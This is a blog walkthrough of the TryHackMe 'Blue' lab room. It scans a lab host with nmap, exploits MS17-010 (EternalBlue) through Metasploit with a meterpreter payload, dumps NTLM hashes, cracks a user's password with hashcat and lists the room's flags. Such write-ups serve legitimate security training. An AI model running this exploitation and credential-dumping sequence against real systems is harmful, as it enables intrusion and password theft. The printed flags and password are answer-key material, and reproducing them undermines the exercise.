---
title: THM - Walkthrough - Blue [Easy]
date: 2024-08-01 00:00:00 +/-TTTT
categories: [Walkthrough]
tags: [ctf, thm, easy, ms17-010]     # TAG names should always be lowercase
---

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif" width="200" height="200" />

Welcome to my writeups for the TryHackMe room Blue. That's an easy room that will help you 
practice your Windows exploitation skills using the MS17-010 vulnerability.
The room is available [here](https://tryhackme.com/room/blue).

## Information Gathering

### Port Scanning

We start by using `nmap` to scan the target machine for open ports and services.

```
$ nmap -sV 10.10.145.137
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-27 13:51 EDT
Nmap scan report for 10.10.145.137
Host is up (0.22s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that the target machine has the following services running:
- `MSRPC` on port 135
- `SMB` on ports 139 and 445
- `RDP` on port 3389

### Vulnerability Scanning 

As we see that the target machine is running Windows the name of the room is Blue we can assume 
that the target machine is vulnerable to the MS17-010 vulnerability (EternalBlue) which concerns
the SMB service.
Let's use `nmap` to confirm that.

```
$ nmap --script smb-vuln-ms17-010 -p445 10.10.145.137
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-27 13:53 EDT
Nmap scan report for 10.10.145.137
Host is up (0.22s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds
```

The target machine is indeed vulnerable to the MS17-010 vulnerability.

## Exploitation

We will use the `msfconsole` to exploit the MS17-010 vulnerability.

```
$ msfconsole
```

```
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.145.137
msf6 > set LPORT 1234
msf6 > set payload windows/x64/meterpreter/bind_tcp
msf6 > run
```

We have successfully exploited the MS17-010 vulnerability and have a shell on the target machine.

![Meterpreter](assets/img/posts/walkthroughs/blue/20240801_blue_meterpreter.png)

As we exploited the MS17-010 vulnerability we already have a NT AUTHORITY\SYSTEM shell.

## Post-Exploitation

### Dumping Password Hashes

We can dump the password hashes from the target machine using the `hashdump` command.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

We can now crack the Jon password hashes using `john` or `hashcat`.

```
$ hashcat -a 0 -m 1000 Jon.hash /usr/share/wordlists/rockyou.txt
```

Quickly we obtain Jon's password which is `alqfna22`.

### Flags

We can now find the flags on the target machine.

![Flag 1](assets/img/posts/walkthroughs/blue/20240801_blue_flag1.png)

![Flag 2](assets/img/posts/walkthroughs/blue/20240801_blue_flag2.png)

![Flag 3](assets/img/posts/walkthroughs/blue/20240801_blue_flag3.png)

**Flag 1:** `flag{access_the_machine}`

**Flag 2:** `flag{sam_database_elevated_access}`

**Flag 3:** `flag{admin_documents_can_be_valuable}`

And that's it! We have successfully exploited the MS17-010 vulnerability and completed the room !
